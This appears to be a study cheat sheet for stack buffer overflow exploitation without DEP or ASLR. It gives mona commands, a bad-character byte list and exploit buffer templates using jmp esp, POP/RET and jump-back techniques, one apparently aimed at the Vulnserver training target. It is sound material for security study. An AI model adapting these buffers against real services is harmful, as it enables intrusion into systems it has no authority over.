# Stack Buffer Overflow (no DEP, no ASLR)

## Step
1. Find initial crash
2. Find offset with:
```py
!py mona pc XXX 
```
3. Find badchar:

```py
bad_chars  = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
bad_chars += b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
bad_chars += b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
bad_chars += b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
bad_chars += b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
bad_chars += b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
bad_chars += b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
bad_chars += b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

4. Exploit:

	1. Is there a lot of space? 
	```py
	!py mona jmp -r esp -cpb '\x00' 
	```
	2. There isn't space?
		
		1.  Try with POP 32; RET and you will point to the Cs
		
		```py
		httpMethod = b"C" * 8 +  b" /" 
		inputBuffer = b"A" * 253 
		inputBuffer += pack("<I",0x00418674) #00418674 pop eax; ret
		httpEndRequest = b"\r\n\r\n" 
		```
		
		2. Try with Jump back
		
		```py
		buffer = b"\x90"*1672
		sub_esp = b"\x83\xEC\x64\x90" * 5 #ESP - 500, (sub esp 100*5)
		buffer += sub_esp
		buffer += shellcode
		buffer += b"\x90"*(388-len(shellcode))
		buffer += pack("<I", 0x1480113d) # : jmp esp 1480113d
		buffer += b"\x90"*3
		buffer += b"\xe9\x07\xfe\xff\xff" #jmp -500 E907FEFFFF
		buffer += b"D"* (total - len(buffer))
		```
		
		3. Look to the other registers. Are there any other near the payload?
		
		```py
		VULNSRVR_CMD = b"KSTET "  # change me
		size = 132  # change me

		stage_one  = b"\x83\xc0\x06"   # add eax,byte +0x6
		stage_one += b"\xff\xe0"  # jmp eax

		payload = VULNSRVR_CMD
		payload += b"A"*70
		payload += struct.pack("<I",0x62501203) #jmp esp 62501203
		payload += b"\x90" * 4
		payload += stage_one
		payload += b"C"*(size-len(payload))
		```

## Resources
1. https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
2. https://epi052.gitlab.io/notes-to-self/blog/2020-05-13-osce-exam-practice-part-one/
3. https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/
4. https://www.bordergate.co.uk/dealing-with-small-buffer-space/
